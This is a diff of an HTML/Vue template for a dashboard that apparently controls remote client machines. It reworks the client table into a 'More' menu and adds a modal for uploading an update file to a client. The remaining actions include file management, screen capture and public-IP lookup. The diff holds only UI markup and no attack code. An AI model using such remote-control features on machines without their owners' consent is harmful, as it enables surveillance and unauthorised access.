@@ -47,36 +47,36 @@
         </header>
 
         <div class="grid grid-cols-1 lg:grid-cols-2 gap-5">
-            <div class="bg-surface border border-border rounded-xl overflow-hidden">
+            <div class="bg-surface border border-border rounded-xl">
                 <div class="px-5 py-4 border-b border-border flex justify-between items-center">
                     <h2 class="font-semibold">${ labels.clients_title }</h2>
                     <span class="text-sm text-gray-400">${ clients.length } ${ labels.online_suffix }</span>
                 </div>
-                <div v-if="clients.length">
-                    <table class="w-full">
+                <div v-if="clients.length" class="overflow-x-auto rounded-b-xl">
+                    <table class="w-full min-w-[800px]">
                         <thead>
                             <tr class="text-xs uppercase text-gray-400 border-b border-border">
-                                <th class="text-left px-4 py-2.5 font-semibold">${ labels.header_id }</th>
-                                <th class="text-left px-4 py-2.5 font-semibold">${ labels.header_ip }</th>
-                                <th class="text-left px-4 py-2.5 font-semibold">${ labels.header_hostname }</th>
-                                <th class="text-left px-4 py-2.5 font-semibold">${ labels.header_os }</th>
-                                <th class="text-left px-4 py-2.5 font-semibold">${ labels.header_version }</th>
-                                <th class="text-left px-4 py-2.5 font-semibold">${ labels.header_actions }</th>
+                                <th class="text-left px-3 py-2.5 font-semibold whitespace-nowrap">${ labels.header_id }</th>
+                                <th class="text-left px-3 py-2.5 font-semibold whitespace-nowrap">${ labels.header_ip }</th>
+                                <th class="text-left px-3 py-2.5 font-semibold whitespace-nowrap">${ labels.header_hostname }</th>
+                                <th class="text-left px-3 py-2.5 font-semibold whitespace-nowrap">${ labels.header_os }</th>
+                                <th class="text-left px-3 py-2.5 font-semibold whitespace-nowrap">${ labels.header_version }</th>
+                                <th class="text-left px-3 py-2.5 font-semibold whitespace-nowrap">${ labels.header_actions }</th>
                             </tr>
                         </thead>
                         <tbody>
                             <tr v-for="c in clients" :key="c.id" class="border-b border-border hover:bg-surface-2 transition">
-                                <td class="px-4 py-3 font-mono text-sm text-indigo-400">${ c.id }</td>
-                                <td class="px-4 py-3 text-sm">${ c.ip }</td>
-                                <td class="px-4 py-3 text-sm">${ c.hostname }</td>
-                                <td class="px-4 py-3"><span class="inline-block px-2 py-0.5 text-xs rounded bg-surface-2 text-gray-400">${ c.os_info }</span></td>
-                                <td class="px-4 py-3"><span class="inline-block px-2 py-0.5 text-xs rounded bg-surface-2 text-gray-400">${ c.version || 'N/A' }</span></td>
-                                <td class="px-4 py-3">
+                                <td class="px-3 py-3 font-mono text-sm text-indigo-400 whitespace-nowrap">${ c.id }</td>
+                                <td class="px-3 py-3 text-sm whitespace-nowrap">${ c.ip }</td>
+                                <td class="px-3 py-3 text-sm whitespace-nowrap">${ c.hostname }</td>
+                                <td class="px-3 py-3 whitespace-nowrap"><span class="inline-block px-2 py-0.5 text-xs rounded bg-surface-2 text-gray-400">${ c.os_info }</span></td>
+                                <td class="px-3 py-3 whitespace-nowrap"><span class="inline-block px-2 py-0.5 text-xs rounded bg-surface-2 text-gray-400">${ c.version || 'N/A' }</span></td>
+                                <td class="px-3 py-3 whitespace-nowrap">
                                     <button @click="showFileManagerFor(c.id)" class="px-2.5 py-1 text-xs bg-transparent border border-border rounded-lg text-green-400 hover:bg-green-500/10 transition mr-1">${ labels.button_file_manager }</button>
-                                    <button @click="showSysInfo(c.id)" class="px-2.5 py-1 text-xs bg-transparent border border-border rounded-lg text-indigo-400 hover:bg-indigo-500/10 transition mr-1">${ labels.sysinfo_btn }</button>
-                                    <button @click="showScreenCapture(c.id)" class="px-2.5 py-1 text-xs bg-transparent border border-border rounded-lg text-purple-400 hover:bg-purple-500/10 transition mr-1">${ labels.button_screen_capture }</button>
-                                    <button @click="showPublicIP(c.id)" class="px-2.5 py-1 text-xs bg-transparent border border-border rounded-lg text-cyan-400 hover:bg-cyan-500/10 transition mr-1">${ labels.button_public_ip }</button>
-                                    <button @click="showDelete(c.id)" class="px-2.5 py-1 text-xs bg-transparent border border-border rounded-lg text-red-500 hover:bg-red-500/10 transition">${ labels.button_delete }</button>
+                                    <button @click="showDelete(c.id)" class="px-2.5 py-1 text-xs bg-transparent border border-border rounded-lg text-red-500 hover:bg-red-500/10 transition mr-1">${ labels.button_delete }</button>
+                                    <div class="relative inline-block">
+                                        <button @click="toggleMoreMenu(c.id, $event)" class="px-2.5 py-1 text-xs bg-transparent border border-border rounded-lg text-gray-400 hover:bg-surface-2 hover:text-gray-200 transition">${ labels.button_more }</button>
+                                    </div>
                                 </td>
                             </tr>
                         </tbody>
@@ -594,6 +594,23 @@
             </div>
         </div>
 
+        <div v-if="updateTarget" class="fixed inset-0 bg-black/60 flex items-center justify-center z-50" @click.self="updateTarget = null">
+            <div class="bg-surface border border-border rounded-xl p-6 max-w-md w-[95%]">
+                <h3 class="text-lg font-semibold mb-4">${ labels.update_title }: ${ updateTarget }</h3>
+                <div class="mb-4">
+                    <label class="block text-xs font-medium text-gray-400 mb-1.5">${ labels.update_select_file }</label>
+                    <input type="file" @change="onUpdateFileSelected" class="w-full px-3.5 py-2 bg-surface-2 border border-border rounded-lg text-sm text-gray-200 file:mr-2 file:py-1 file:px-3 file:rounded file:border-0 file:bg-orange-600 file:text-white file:text-sm file:cursor-pointer file:hover:bg-orange-500">
+                </div>
+                <div class="flex gap-2">
+                    <button @click="updateTarget = null; updateSelectedFile = null" class="flex-1 px-4 py-2 bg-transparent border border-border hover:bg-surface-2 text-gray-300 text-sm font-medium rounded-lg transition">${ labels.cancel_btn }</button>
+                    <button @click="confirmServiceUpdate" :disabled="!updateSelectedFile || updateLoading" class="flex-1 px-4 py-2 bg-orange-600 hover:bg-orange-500 disabled:opacity-50 disabled:cursor-not-allowed text-white text-sm font-medium rounded-lg transition">
+                        <svg v-if="updateLoading" class="w-3.5 h-3.5 inline mr-1 animate-spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10" stroke-dasharray="32" stroke-dashoffset="32" class="animate-[spin_1s_linear_infinite]"/></svg>
+                        ${ updateLoading ? labels.update_uploading : labels.update_btn_update }
+                    </button>
+                </div>
+            </div>
+        </div>
+
         <div v-if="deleteTarget" class="fixed inset-0 bg-black/60 flex items-center justify-center z-50" @click.self="deleteTarget = null">
             <div class="bg-surface border border-border rounded-xl p-6 max-w-sm w-[90%]">
                 <h3 class="text-lg font-semibold mb-3">${ labels.delete_title }</h3>
@@ -603,6 +620,13 @@
                     <button @click="confirmDelete" class="px-4 py-2 bg-red-600 hover:bg-red-500 text-white text-sm font-medium rounded-lg transition">${ labels.confirm_delete_btn }</button>
                 </div>
             </div>
+        </div>
+
+        <div v-if="moreMenuId !== null" class="fixed w-40 bg-surface border border-border rounded-lg shadow-lg z-50" :style="{ top: moreMenuTop + 'px', left: moreMenuLeft + 'px' }">
+            <button @click="showSysInfo(moreMenuId); moreMenuId = null" class="w-full text-left px-3 py-2 text-xs text-indigo-400 hover:bg-surface-2 transition rounded-t-lg">${ labels.sysinfo_btn }</button>
+            <button @click="showScreenCapture(moreMenuId); moreMenuId = null" class="w-full text-left px-3 py-2 text-xs text-purple-400 hover:bg-surface-2 transition">${ labels.button_screen_capture }</button>
+            <button @click="showPublicIP(moreMenuId); moreMenuId = null" class="w-full text-left px-3 py-2 text-xs text-cyan-400 hover:bg-surface-2 transition">${ labels.button_public_ip }</button>
+            <button @click="showServiceUpdate(moreMenuId); moreMenuId = null" class="w-full text-left px-3 py-2 text-xs text-orange-400 hover:bg-surface-2 transition rounded-b-lg">${ labels.button_service_update }</button>
         </div>
 
         <div class="fixed bottom-6 right-6 px-4 py-3 rounded-lg text-sm font-medium transition-all duration-300 translate-y-[100px] opacity-0" :class="[toastType, toast ? 'translate-y-0 opacity-100' : '']">${ toast }</div>
